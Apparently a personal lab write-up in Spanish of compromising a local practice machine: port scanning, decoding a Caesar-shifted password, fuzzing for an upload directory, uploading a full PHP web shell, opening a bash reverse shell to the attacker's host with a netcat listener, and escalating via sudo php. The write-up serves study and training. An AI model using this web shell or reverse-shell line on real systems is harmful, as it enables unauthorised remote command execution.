Fecha: 03/09/2024

Empiezo escaneando la máquina: 
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](../Imágenes/Pasted%20image%2020240903165012.png)
Por lo que parece tiene tanto http en el puerto 80 como https en el 443. Hay un fichero llamado backup.txt, que voy a ojear: 
![](../Imágenes/Pasted%20image%2020240903165118.png)
Da la contraseña para el usuario `mateo`, que está cifrada con Caesar (que consiste en sumar el valor de una letra a n y luego hacer módulo del mismo). 

Usaré un script similar al que creé para resolver el reto [credstuff](../../picoCTF/Cryptography/Medium/credstuff/credstuff.md) de picoCTF:

```python
import string
letras_minusculas = list(string.ascii_lowercase)

entrada = "hdvbfuadcb"

n_letras = len(letras_minusculas)

for i in range(n_letras):
    salida = ""
    for caracter in entrada:
        salida += letras_minusculas[(letras_minusculas.index(caracter)+i)%n_letras]
    print(salida)
```

De entre todas las salidas la más legible es "easycrxazy", así que probaré con esa primero (cuando sepa donde usarla, claro).

Cuando accedo por https veo que es un "blog" al que los usuarios pueden subir archivos. De momento, hay un "post1.txt" subido, así que pruebo a intentar subir archivos. Pruebo a subir otros "txts" y funciona: 

![](../Imágenes/Pasted%20image%2020240903170512.png)

Usaré fuzzing para encontrar el path a los archivos, y ver si podré hacer un local file inclusion:
```bash 
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u https://172.17.0.2/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing  
```

Hay un directorio uploads, en el que se encuentran los archivos:

![](../Imágenes/Pasted%20image%2020240903170750.png)
![](../Imágenes/Pasted%20image%2020240903170818.png)

Intentaré subir una command line de php como la usado en la máquina "Dockerlabs":
#TODO insertar enlace cuando separe las máquinas por ficheros
```php
SHELL:  
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
Simplemente me descargo el código del repositorio y lo meto en el archivo "shell.php". Por lo que parece la subida de archivos no está sanitizada, ya que me permite subirlo directamente: 

![](../Imágenes/Pasted%20image%2020240903171242.png)

Desde la misma me haré una reverse shell a mi máquina:
```bash
# En la shell virtual:
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'
# En mi máquina atacante:
nc -lvnp 9001
```


![](../Imágenes/Pasted%20image%2020240903172228.png)

Tras probar con todas las contraseñas, intento a quitar la x, que me resultaba rara:

![](../Imágenes/Pasted%20image%2020240903172340.png)

Veo que puedo usar php como superusuario, así que compruebo https://gtfobins.github.io/gtfobins/php/#sudo, de forma exitosa:

![](../Imágenes/Pasted%20image%2020240903172435.png)
